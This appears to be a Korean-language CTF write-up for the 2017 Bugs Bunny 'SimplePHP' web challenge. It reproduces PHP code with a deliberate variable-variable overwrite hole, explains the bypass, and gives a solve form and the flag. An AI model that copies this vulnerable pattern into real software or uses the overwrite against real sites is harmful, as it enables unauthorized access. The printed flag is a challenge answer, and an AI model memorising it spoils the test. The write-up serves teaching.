# 2017 Bugs Bunny - [Web] SimplePHP
## Problem
```
PHP for noobs :p ?
Maybe not this time :D

http://34.253.165.46/SimplePhp/index.php
source : http://34.253.165.46/SimplePhp/index.txt

Author: TnMch
```

## Solution
처음 index.php 를 들어가면 `BugsBunnyCTF is here :p...` 라는 문자열만 있고,
아무 것도 없는 것이 보인다.
index.txt 로 해당문제의 소스가 주어져있는데, 이를 확인해보면 다음과 같이 소스가 나온다.
```
<?php

include "flag.php";

$_403 = "Access Denied";
$_200 = "Welcome Admin";

if ($_SERVER["REQUEST_METHOD"] != "POST")
	die("BugsBunnyCTF is here :p...");

if ( !isset($_POST["flag"]) )
	die($_403);


foreach ($_GET as $key => $value)
	$$key = $$value;

foreach ($_POST as $key => $value)
	$$key = $value;


if ( $_POST["flag"] !== $flag )
	die($_403);


echo "This is your flag : ". $flag . "\n";
die($_200);

?>
```

다음을 보면, 페이지에 접속을 했을 때, `HTTP METHOD` 가 `POST` 가 아닌 경우에
`BugsBunnyCTF is here :p...` 이라는 문자열을 출력하고, `POST` 변수로 `flag` 를 입력받는다.

`$$key = $$value` 로 가변 변수를 사용하는 것을 확인할 수 있다.
가변변수는 예를 들어 다음과 같은 코드가 있다고 해보자,
```
<?php
$a = 'hello';
$$a = 'world';
echo "$a ${$a}<br>";
echo "$a $hello";
?>
```
여기서 `$a` 는 `hello` 라는 문자열이 들어가고, `$$a` 에는 `world` 라는 문자열이
들어가는데 가변변수는 변수값을 취해서 변수명으로 취급한다.

결론적으로는  `$hello` 라는 변수 역시 생긴것이다.

그렇다면, `GET` 방식으로 `_200` 이라는 변수에 flag 를 넣어주고, `POST` 방식으로
`flag` 변수에 아무값을 넣어 넘겨주기만 하면 된다.

그렇다면 php 내부에서 돌아가는 코드는 대략 이렇게 된다.
```
<?php

include "flag.php";

$_403 = "Access Denied";
$_200 = "Welcome Admin";

if ($_SERVER["REQUEST_METHOD"] != "POST")
	die("BugsBunnyCTF is here :p...");

if ( !isset($_POST["flag"]) )
	die($_403);


foreach ($_GET as $_200 => $flag)
	$_200 = $flag;

foreach ($_POST as $$flag => $value)
	$$flag = $value;


if ( $_POST["flag"] !== $flag )
	die($_403);


echo "This is your flag : ". $flag . "\n";
die($flag);

?>
```

`$_200` 변수에 `$flag` 가 들어가게 되고, 기존에 `$flag` 는 사용자 입력값으로
바뀌게 된다.

그러면, `GET` 방식으로 `_200` 에 `flag` 를 넣어주고, `flag` 에는 아무값을 입력해주면
다음과 같이 나온다.

```
This is your flag : tendollar Bugs_Bunny{Simple_PHP_1s_re4lly_fun_!!!}
```

Flag : `Bugs_Bunny{Simple_PHP_1s_re4lly_fun_!!!}`

## Solve.html Source
```
<!DOCTYPE html>
<html>
<head>
	<title> SimplePHP Solve HTML Code</title>
</head>
<body>
<form action="http://34.253.165.46/SimplePhp/index.php?_200=flag" method="POST">
<input type="text" name="flag"><br>
<input type="submit" value="ok">
</form>
</body>
</html>
```
